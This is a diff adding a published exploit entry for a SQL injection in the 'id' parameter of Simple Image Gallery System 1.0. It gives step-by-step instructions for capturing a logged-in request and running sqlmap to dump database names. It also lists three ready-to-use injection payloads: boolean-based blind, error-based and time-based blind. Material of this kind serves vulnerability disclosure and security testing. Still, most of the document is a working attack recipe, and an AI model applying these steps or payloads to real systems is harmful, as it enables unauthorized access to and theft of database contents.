@@ -1,0 +1,47 @@
+# Exploit Title: Simple Image Gallery System 1.0 - 'id' SQL Injection
+# Date: 2020-08-12
+# Exploit Author: Azumah Foresight Xorlali (M4sk0ff)
+# Vendor Homepage: https://www.sourcecodester.com/php/14903/simple-image-gallery-web-app-using-php-free-source-code.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=14903&title=Simple+Image+Gallery+Web+App+using+PHP+Free+Source+Code
+# Version: Version 1.0
+# Category: Web Application
+# Tested on: Kali Linux
+
+Description:
+Simple Image Gallery System 1.0 application is vulnerable to
+SQL injection via the "id" parameter on the album page.
+
+POC:
+
+Step 1. Login to the application with any verified user credentials
+
+Step 2. Click on Albums page and select an albums if created or create
+by clicking on "Add New" on the top right and select the album.
+
+Step 3. Click on an image and capture the request in burpsuite.
+Now copy the request and save it as test.req .
+
+Step 4. Run the sqlmap command "sqlmap -r test.req --dbs
+
+Step 5. This will inject successfully and you will have an information
+disclosure of all databases contents.
+
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=3' AND 7561=7561 AND 'SzOW'='SzOW
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or
+GROUP BY clause (FLOOR)
+    Payload: id=3' OR (SELECT 9448 FROM(SELECT
+COUNT(*),CONCAT(0x7178707071,(SELECT
+(ELT(9448=9448,1))),0x71787a7171,FLOOR(RAND(0)*2))x FROM
+INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'SXqA'='SXqA
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=3' AND (SELECT 1250 FROM (SELECT(SLEEP(5)))aNMX) AND
+'qkau'='qkau
+---
